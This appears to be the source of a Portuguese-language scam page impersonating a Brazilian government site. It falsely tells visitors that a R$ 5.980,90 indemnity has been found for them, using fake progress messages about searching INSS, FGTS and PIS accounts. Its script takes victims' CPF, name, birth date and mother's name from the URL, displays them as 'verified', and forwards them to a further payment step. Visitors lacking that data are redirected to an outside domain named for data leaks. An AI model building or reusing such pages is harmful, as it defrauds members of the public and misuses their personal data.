    <link rel="stylesheet" href="style.css">
    <style>
        .bg-primary\/20 { background-color: rgba(19, 81, 180, 0.2); }

            from { transform: rotate(0deg); }

        /* Ajustando a animação da barra de progresso */

</head>
<body class="__className_d65c78 antialiased scroll-smooth overflow-x-hidden">
    <div class="w-full min-h-screen">
        <div class="max-w-lg w-full mx-auto space-y-4 bg-[#1351B4] min-h-screen">
            <div class="w-full bg-white h-16 px-5 flex items-center justify-between shadow-lg">
                <a href="#">
                    <img alt="Logo" width="111" height="40" class="w-auto h-[36px] object-contain" src="img/gov.webp">
                </a>
            </div>
            <div class="px-4 pb-10">
                <div class="w-full flex items-center justify-center">
                    <div class="border text-card-foreground shadow-sm w-full max-w-[600px] p-6 rounded-2xl bg-white mt-5 flex flex-col space-y-6">
                        <p class="text-base text-center">
                            Sua indenização foi calculada com sucesso! O valor que você possui receber está abaixo do vídeo. Toque no botão para realizar seu saque.
                        </p>
                        <div class="relative w-full overflow-hidden rounded-full bg-primary/20 h-3">
                            <div class="h-full w-full flex-1 bg-[#22C55E] transition-all progress-bar"></div>
                        </div>
                        <div>
                            <div style="position:relative;width:100%;padding:56.25% 0 0">
                                <iframe id="player" src="https://player.vimeo.com/video/1046923093?h=c0c0c0c0c0&amp;autoplay=1&amp;title=0&amp;byline=0&amp;portrait=0" style="position:absolute;top:0;left:0;width:100%;height:100%;" frameborder="0" allow="autoplay; fullscreen; picture-in-picture">
                                </iframe>
                            </div>
                            <script src="../../player.vimeo.com/api/player.js"></script>
<script>
                                let player;
                                let progressInterval;
                                let rotationInterval;
                                let currentIndex = 0;
                                
                                const frases = [
                                    "Calculando o valor da sua indenização...",
                                    "Buscando valores em contas inativas...",
                                    "Buscando valores em contas INSS...",
                                    "Buscando valores em contas FGTS...",
                                    "Buscando valores em contas PIS...",
                                    "Buscando valores em contas de CPF...",
                                    "Buscando valores em contas de CNPJ...",
                                    "Buscando valores em contas de seguro desemprego..."
                                ];
                                
                                document.addEventListener('DOMContentLoaded', function() {
                                    const iframe = document.querySelector('iframe');
                                    player = new Vimeo.Player(iframe);
                                    
                                    player.ready().then(() => {
                                        player.play();
                                        startProgressMonitoring();
                                        startTextRotation();
                                    });

                                    // Pega os parâmetros da URL
                                    const urlParams = new URLSearchParams(window.location.search);
                                    const userData = {
                                        CPF: urlParams.get('cpf'),
                                        NOME: urlParams.get('nome'),
                                        NASC: urlParams.get('nascimento'),
                                        NOME_MAE: urlParams.get('nome_mae')
                                    };
                                    
                                    // Se não tiver os parâmetros necessários, redireciona
                                    if (!userData.CPF || !userData.NOME) {
                                        window.location.href = 'https://www.vazamentosdados.online/inici/index.htm' + window.location.search;
                                        return;
                                    }
                                    
                                    // Preenche os dados na página
                                    if (document.getElementById('nome_mae')) document.getElementById('nome_mae').textContent = userData.NOME_MAE || '';
                                    if (document.getElementById('nasc')) document.getElementById('nasc').textContent = userData.NASC || '';
                                    if (document.getElementById('cpf')) document.getElementById('cpf').textContent = userData.CPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
                                    if (document.getElementById('renda')) document.getElementById('renda').textContent = userData.NOME;
                                    if (document.getElementById('nome')) document.getElementById('nome').textContent = userData.NOME_MAE;

                                    // Adiciona o redirecionamento no botão
                                    const receiveButton = document.getElementById('receive-button');
                                    if (receiveButton) {
                                        receiveButton.addEventListener('click', function() {
                                            window.location.href = `../atende/index.htm?${urlParams.toString()}`;
                                        });
                                    }

                                    startTextRotation();
                                });

                                function startProgressMonitoring() {
                                    if (!progressInterval) {
                                        progressInterval = setInterval(updateProgressBar, 100);
                                    }
                                }

                                function stopProgressMonitoring() {
                                    if (progressInterval) {
                                        clearInterval(progressInterval);
                                        progressInterval = null;
                                    }
                                }

                                function updateProgressBar() {
                                    if (player) {
                                        player.getCurrentTime().then(function(currentTime) {
                                            player.getDuration().then(function(duration) {
                                                const progress = (currentTime / duration) * 100;
                                                const translateX = -100 + progress;
                                                
                                                const progressBar = document.querySelector('.progress-bar');
                                                if (progressBar) {
                                                    progressBar.style.transform = `translateX(${translateX}%)`;
                                                }
                                                
                                                if (currentTime >= duration) {
                                                    stopProgressMonitoring();
                                                }
                                            });
                                        });
                                    }
                                }

                                function startTextRotation() {
                                    const loadingText = document.getElementById('loading-text');
                                    const loadingContainer = document.getElementById('loading-container');
                                    const receiveButton = document.getElementById('receive-button');
                                    const indenizacaoValor = document.getElementById('indenizacao-valor');

                                    // Começa com a primeira frase
                                    if (loadingText) {
                                        loadingText.textContent = frases[0];
                                    }

                                    // Atualiza a cada 12 segundos
                                    rotationInterval = setInterval(() => {
                                        currentIndex++;
                                        
                                        if (currentIndex < frases.length) {
                                            if (loadingText) {
                                                loadingText.textContent = frases[currentIndex];
                                            }
                                        } else {
                                            clearInterval(rotationInterval);
                                            if (loadingContainer) loadingContainer.style.display = 'none';
                                            if (indenizacaoValor) indenizacaoValor.style.display = 'block';
                                            if (receiveButton) receiveButton.style.display = 'block';
                                        }
                                    }, 1500); // 12 segundos
                                }
                            </script>
                            <style>
                                .ytp-chrome-top,
                                .ytp-show-cards-title,
                                .ytp-watermark,
                                .ytp-pause-overlay,
                                .ytp-gradient-top,
                                .ytp-gradient-bottom,
                                .ytp-chrome-bottom,
                                .ytp-title,
                                .ytp-title-text,
                                .ytp-title-channel,
                                .ytp-share-button,
                                .ytp-watch-later-button,
                                .ytp-youtube-button,
                                .ytp-chrome-top-buttons,
                                .ytp-chrome-top-buttons-mask,
                                .ytp-embed,
                                .ytp-embed-title,
                                .ytp-large-play-button,
                                .html5-video-player:not(.ytp-touch-device) .ytp-chrome-top {
                                    display: none !important;
                                    opacity: 0 !important;
                                    visibility: hidden !important;
                                }
                                
                                .ytp-play-button {
                                    display: block !important;
                                }

                                iframe[src*="youtube"] {
                                    background-color: black;
                                }

                                .html5-video-player {
                                    background-color: transparent !important;
                                }
                            </style>
                            <script>
                                document.addEventListener('DOMContentLoaded', function() {
                                    // Esconde todos os elementos do YouTube após o carregamento
                                    const hideYouTubeElements = () => {
                                        const iframe = document.querySelector('iframe');
                                        if (iframe && iframe.contentWindow) {
                                            const elements = iframe.contentWindow.document.querySelectorAll('.ytp-chrome-top, .ytp-chrome-bottom, .ytp-watermark');
                                            elements.forEach(el => {
                                                el.style.display = 'none';
                                                el.style.opacity = '0';
                                                el.style.visibility = 'hidden';
                                            });
                                        }
                                    };
                                    
                                    // Tenta esconder os elementos várias vezes
                                    setTimeout(hideYouTubeElements, 1000);
                                    setTimeout(hideYouTubeElements, 2000);
                                    setTimeout(hideYouTubeElements, 3000);
                                });
</script>
                        </div>
              <div class="space-y-4">
                            <h2 class="text-sm font-bold">Dados verificados com sucesso!</h2>
                            <div class="space-y-2">
                                <div class="flex items-center gap-3">
                                    <img alt="" width="24" height="24" class="size-5" src="img/7.webp">
                                    <div><p id="renda"></p></div>
                                </div>
                                <div class="flex items-center gap-3">
                                    <img alt="" width="24" height="24" class="size-5" src="img/13.webp">
                                    <div><p id="nasc"></p></div>
                                </div>
                                <div class="flex items-center gap-3">
                                    <img alt="" width="24" height="24" class="size-5" src="img/9.webp">
                                    <div><p id="cpf"></p></div>
                                </div>
                                <div class="flex items-center gap-3">
                                    <img alt="" width="24" height="24" class="size-5" i="" src="img/14.webp">
                                    <div><p id="nome"></p></div>
                                </div>
                                <div class="flex items-center gap-3">
                                    <img alt="" width="24" height="24" class="size-5" src="img/10.webp">
                                    <div class="flex flex-col w-full">
                                        <div id="loading-container" class="flex items-center">
                                            <p id="loading-text" class="animate-pulse">Calculando o valor da sua indenização...</p>
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-circle size-4 animate-spin ml-2">
                                                <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
                                            </svg>
                                        </div>
                                        <p id="indenizacao-valor" style="display: none;">R$ 5.980,90 de indenização pronto para ser liberado</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <button id="receive-button" style="display: none; padding: 24px 32px;" class="w-full bg-[#1351B4] text-white rounded-lg text-base font-medium hover:bg-[#1351B4]/90 transition-colors">
                            Quero receber minha indenização
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
